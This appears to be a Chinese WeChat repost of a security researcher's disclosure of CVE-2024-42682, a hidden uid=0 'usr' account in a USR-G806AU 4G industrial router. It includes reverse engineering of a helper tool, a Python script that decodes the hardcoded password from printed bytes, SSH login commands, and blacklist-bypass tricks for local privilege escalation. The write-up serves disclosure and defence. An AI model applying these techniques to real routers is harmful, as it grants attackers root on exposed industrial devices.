---
title: 一个4G工业路由器里的隐藏超级用户：我是怎么发现它的
url: https://mp.weixin.qq.com/s/RUHKw60hZninxyWV8P_JZQ
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:57:02.999369
---

# 一个4G工业路由器里的隐藏超级用户：我是怎么发现它的

![cover_image](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibev82ZK3wqypsHl8Fkz0qPm4IyBnh755cglfblUHsKQZHO0md5gF1b8icbg3wS4yRh6qtmk3rggicdFHlXRRQ9hyvCr7RVdNsdPM/0?wx_fmt=png&from=appmsg)

# 一个4G工业路由器里的隐藏超级用户：我是怎么发现它的

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 本文记录了我从二手店淘来的USR-G806AU 4G工业路由器中，发现了一个隐藏的uid=0超级用户账号的过程。通过逆向分析设备上的一个辅助工具，我恢复了这个账号的密码，并确认它能通过SSH远程登录。最终，这个漏洞被分配了CVE-2024-42682。文章还展示了多种本地提权方法，以及给厂商和用户的建议。

这不是什么科幻剧情，就是一个再普通不过的周末项目。我在澳洲二手网站上搜设备练手，看到一台4G工业路由器，才不到100澳元，功能还挺多，就下单了。

![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibev82ZK3wqypsHl8Fkz0qPm4IyBnh755cglfblUHsKQZHO0md5gF1b8icbg3wS4yRh6qtmk3rggicdFHlXRRQ9hyvCr7RVdNsdPM/640?wx_fmt=png&from=appmsg)

机器到手，型号是USR-G806AU，后面带AU说明是澳洲版。制造商是济南有人物联网技术有限公司（PUSR），官网上写自己是“行业领先的IIoT软硬件解决方案提供商”。

插电、开机、连上网——一切正常。我顺手拿办公室角落里吃灰的树莓派当跳板，路由器直连树莓派网口，树莓派连Wi-Fi，我笔记本SSH进树莓派再操作路由器。这样既安全又方便。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeRPMYIXH6ZBAZiaYsy0qjjAGdZ2MSMph8GyibUh9BD7YpdzzYGJGKjaKdRhtCdiciampDz9xhlTuR2Dibps7Lic1b1lc9cE21OPbSIU/640?wx_fmt=webp&from=appmsg)

几分钟后灯亮了，活了。

很快我发现，固件版本1.0.41上已经有人发现了一个root用户，密码是root。我试了下，SSH（端口2222）和Telnet（端口2233）都能登录。但登录进去之后有点懵——这个root账号看起来像是root，名字也叫root，但跑`id`一看，UID是2，不是0。说人话就是：这个root不是真正的超级用户。

翻了一下`/etc/passwd`文件：

root:x:2:2:root:/root:/bin/ash
root:x:2:2:admin:/admin:/bin/ash
daemon:\*:1:1:daemon:/var:/bin/false
ftp:\*:55:55:ftp:/home/ftp:/bin/false
network:\*:101:101:network:/var:/bin/false
nobody:\*:65534:65534:nobody:/var:/bin/false
rpc:x:65533:65533:rpc:/var/empty:/bin/false
sshd:x:22:22:sshd:/var/empty:/bin/false
usr:x:0:0:Linux User,,,:/root:/bin/ash

倒数第二行亮瞎眼：一个叫`usr`的用户，UID是0。这才是真正的超级用户。Linux内核不管你用户名是啥，只看UID——UID=0就是神仙。所以这个root（uid=2）就是个假root，真正的主子藏在`usr`（uid=0）里。难怪之前`ls -l`看系统文件，所有者都是`usr`，这下全明白了。

接下来我决定把整个文件系统dump出来好好分析。设备是MIPS32le架构，小端32位。我先用scp传了个自己编译的BusyBox上去，里面带了Netcat。然后读取`/dev/mtdblock5`（rootfs分区），通过Netcat传给树莓派，再转到工作站上用Binwalk解包。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibdCRdHA8Rll8DD2hGndcyjicialMVgpzVS8ia4fNic11okuDfHqHhIBxvXoTd0YrZRywlN7KT4uicaYJN6ogW9M1c409sjILBSw9Mic4/640?wx_fmt=webp&from=appmsg)

Binwalk成功识别了SquashFS和JFFS2文件系统。解包后我有了完整的文件系统目录。

重点来了：`/bin`目录下有个叫`usr_root`的工具。光看名字就知道跟`usr`用户有关。跑一下`usr_root --help`：

usage: usr\_root "cmd"
valid cmd: /sbin/reboot,/sbin/tcpdump

这些命令正常都需要超级用户权限才能执行。所以我怀疑这玩意儿能让低权限用户（比如root（uid=2））以`usr`身份跑特定命令。

把`usr_root`丢进Ghidra逆向。第一眼就看到它用`sprintf`拼了一个`su - usr -c "..."`的命令，然后`popen`执行。既然`su`需要密码，那密码肯定藏在某个地方。要么硬编码在二进制里，要么运行时能拿到。

梳理逻辑后发现：这个工具先检查用户输入的命令是否以`/sbin/`、`/bin/`、`/usr/sbin/`或`/usr/bin/`开头，然后检查是否包含黑名单里的坏字符（像`$`、`;`、`&`这些shell注入元字符），最后检查是否至少包含一个合法命令（`/sbin/reboot`或`/sbin/tcpdump`）。通过了所有检查，它就会调用`su - usr -c "输入的命令"`，并通过管道把密码喂给`su`。

密码就在那个叫`mystery`的结构体里。工具启动时，从静态数据`mystery_data`复制14字节到结构体的`second`字段，然后调用函数`FUN_00400ae0`处理。这个函数遍历`second`里的每个字节，加上`0x61`，结果存到`first`字段——这就是`usr`的密码。之后`fputs(mystery.first, pipe)`就把密码写进`su`进程了。

写个Python脚本解码：

#!/usr/bin/env python3
import binascii

encoded\_password = binascii.a2b\_hex("09071a14d9040e1408dd1a0e0a15")

decoded\_password = ""
for c in encoded\_password:
    new\_c = c + 0x61
    new\_c\_truncated = new\_c % 256
    decoded\_password += chr(new\_c\_truncated)

print(decoded\_password)

输出是一串看着像乱码的东西。我试了——居然真能登录！

root@router$ su - usr -c id
Password:
-----------------------------------------------------
               \*\* USR-G806 \*\*
-----------------------------------------------------
 \* company:          JiNan Usr IOT Technology Limited
 \* website:          www.usr.cn
 \* client support:   h.usr.cn
-----------------------------------------------------
-----------------------------------------------------
uid=0(usr) gid=0(usr) groups=0(usr)

更狠的是，SSH也能直接连：

user@raspberrypi$ ssh -p 2222 usr@192.168.1.1
usr@192.168.1.1's password:

BusyBox v1.22.1 (2023-03-31 13:57:28 CST) built-in shell (ash)
usr@router:~#

一个隐藏的超级用户账号，密码就硬编码在设备里的辅助工具中，而且SSH默认开启。这就是CVE-2024-42682。

在分析过程中，我还发现了几个通过`usr_root`实现本地提权的技巧。但看怎么绕过它那层检查。黑名单不完整——`$()`和``` `` ```没被禁。可以用命令替换执行任意代码。还有参数堆叠技巧：`/bin/sh -c '真正命令' -c /sbin/tcpdump`，第二个`-c`参数被忽略，但满足了必须包含合法命令的要求。

另外还发现，`usr_root`其实没用到`su`的密码功能——它直接把密码喂给`su`。所以更直接的办法是：从二进制里把密码解码出来，然后直接SSH登录。

至于密码到底是多少？我们决定不公开。但给了scrypt哈希，如果你觉得你知道密码，可以用它验证：

scrypt$ln=20,r=8,p=1$o7jBoRKJDLa0h4PBbgdFcw$2Tevyp9Q7jDWRASxRHC6VVXlaPQvB4bUEnd4eGWUeQc

脚本可以参考文章附录的Python验证代码。

回顾整个流程：2024年7月联系PUSR，他们说这个账号是开发用途，不提供给客户，要求我们不要公开恢复密码的方法，后来就不再回复了。我们也在7月报告给了澳大利亚网络安全中心（ACSC）。8月Mitre分配了CVE。之后多次尝试联系厂商均无回应。2026年4月（按政策，首次报告后120天或修复后30天）公开。

对用户来说，最直接的防护：别把管理端口暴露到不可信网络（比如公网）。默认情况下SSH和Telnet在2222和2233端口监听，Shodan上能搜到不少暴露的设备。HTTP端口也五花八门：80、1080、8008、8888、9080都有。

对系统开发者来说：别用`su`做自动化提权，因为`su`需要明文密码，密码要么硬编码要么可逆。改用`sudo`，配合精细的sudoers策略，既能满足需求又不用存密码。虽然很多嵌入式设备为了节省空间不装sudo，但OpenWRT可以通过`opkg`安装。实在不行，至少把密码放在单独分区并限制读取权限。

最后，如果你也在琢磨硬件破解，强烈建议淘个便宜的二手路由器练手。淘宝、闲鱼、亚马逊、甚至报废物资拍卖行都行。这玩意儿不一定要多新多贵，因为迟早要拆得七零八落。

如果你用的是PUSR的设备，并且能推动他们修复这个问题，请通过research@tantosec.com联系我们。我们很想知道后续进展。

---

### 参考资料

[1] https://tantosec.com/blog/2026/04/route-to-root-in-4g-industrial-router/

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

幻泉之洲

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过